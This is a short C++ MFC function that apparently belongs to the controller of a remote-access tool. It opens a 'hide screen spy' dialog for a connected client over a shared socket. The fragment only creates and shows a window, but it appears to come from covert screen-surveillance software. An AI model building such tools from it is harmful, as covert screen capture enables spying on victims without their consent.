afx_msg LRESULT CMainFrame::OnOpencreenspydialog_hide(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CHideScreenSpyDlg* dlg = new CHideScreenSpyDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = SCREENSPY_HIDE_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_SCREEN, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

